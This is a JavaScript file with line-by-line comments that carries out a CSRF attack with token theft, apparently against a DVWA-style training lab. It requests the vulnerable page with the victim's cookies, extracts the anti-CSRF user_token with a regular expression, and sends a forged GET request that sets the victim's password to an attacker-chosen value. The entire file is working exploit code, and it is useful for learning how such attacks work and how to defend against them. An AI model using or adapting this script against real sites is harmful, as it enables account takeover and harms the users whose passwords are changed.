// Define the hostname of the vulnerable website, which is supposed to be replaced by the attacker's installation IP
var hostname = 'http://YOUR-INSTALLATION-IP';
// Define the URL of the CSRF vulnerability, which is a page that allows changing the password with a GET request
var the_url = hostname + '/vulnerabilities/csrf';
// Define the new password that the attacker wants to set for the victim
var pass = 'newpasswd123';
// Define a regular expression to extract the user token from the HTML response, which is a hidden input field that contains a random value
var regex = /user_token\' value\=\'(.*?)\' \/\>/;

// Create an XMLHttpRequest object to send and receive HTTP requests
if (window.XMLHttpRequest){
    xmlhttp=new XMLHttpRequest();
}else{
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

// Set the withCredentials property to true, which means that the request will include cookies and other credentials
xmlhttp.withCredentials = true;
// Define a variable to indicate whether the attack has been activated or not
var activated = false;
// Define a function that will be executed when the readyState or status of the request changes
xmlhttp.onreadystatechange=function(){
    // Check if the request is completed and successful
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200)
    {
        // Get the text of the response, which is the HTML source code of the CSRF vulnerability page
        var text = xmlhttp.responseText;
        // Use the regular expression to match the user token from the response text
        var match = text.match(regex);
        // Get the first captured group from the match, which is the user token value
        var token = match[1];
        // Construct a new URL that contains the user token, the new password, and the Change parameter, which will trigger the password change action on the server
        var new_url = the_url + '/?user_token=' + token + '&password_new=' + pass + '&password_conf=' + pass + '&Change=Change'
        // Check if the attack has not been activated yet
        if(!activated){
            // Display an alert message to show the user token that was received, which is for demonstration purposes only and not necessary for the attack
            alert('Token that was received: ' + match[1]);
	    // Set the activated variable to true, which means that the attack has been executed once
	    activated = true;
            // Open a new GET request with the new URL, which will send the forged request to change the password
            xmlhttp.open("GET", new_url, false );
            // Send the request without any data
            xmlhttp.send();
        }
    }
};
// Open a GET request with the original URL, which will fetch the CSRF vulnerability page and get the user token
xmlhttp.open("GET", the_url, false );
// Send the request without any data
xmlhttp.send();
